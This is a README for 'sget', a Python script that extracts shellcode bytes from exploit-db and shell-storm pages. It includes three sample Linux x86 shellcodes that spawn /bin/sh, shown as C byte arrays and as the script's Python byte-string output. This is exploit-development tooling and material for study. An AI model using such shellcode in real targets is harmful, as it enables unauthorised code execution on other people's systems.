# sget - like wget, but for shellcodes

**sget** is a python script that automates the extraction of shellcode bytes by parsing HTML source code from a file or a website, such as [exploit-db](https://www.exploit-db.com/shellcodes) or [shell-storm](http://shell-storm.org/shellcode).

Sometimes shellcode bytes are splitted on multiple lines, e.g. [exploit-db.com/raw/13376](https://www.exploit-db.com/raw/13376):
```
char shellcode[] =
  "\x6a\x0b"                // push   $0xb
  "\x58"                    // pop    %eax
  "\x99"                    // cltd
  "\x52"                    // push   %edx
  "\x68\x2f\x2f\x73\x68"    // push   $0x68732f2f
  "\x68\x2f\x62\x69\x6e"    // push   $0x6e69622f
  "\x89\xe3"                // mov    %esp, %ebx
  "\x52"                    // push   %edx
  "\x53"                    // push   %ebx
  "\x89\xe1"                // mov    %esp, %ecx
  "\xcd\x80";               // int    $0x80
```

The output in this case will be:
```
shellcode = b'\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52\x53\x89\xe1\xcd\x80'
(23 bytes)
```

## Usage

```
usage: sget.py [-h] (-u URL | -f FILE)

options:
  -h, --help  show this help message and exit
  -u URL      URL
  -f FILE     File path
```

With an url:
```
$ python3 sget.py -u https://www.exploit-db.com/raw/13375

# Output:
shellcode = b'\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31\xd2\xb0\x0b\xcd\x80'
(25 bytes)
```

With a file:
```
$ wget -q http://shell-storm.org/shellcode/files/shellcode-851.html
$ python3 sget.py -f shellcode-851.html

# Output:
shellcode = b'\x31\xc9\xf7\xe9\x51\x04\x0b\xeb\x08\x5e\x87\xe6\x99\x87\xdc\xcd\x80\xe8\xf3\xff\xff\xff\x2f\x62\x69\x6e\x2f\x2f\x73\x68'
(30 bytes)
```
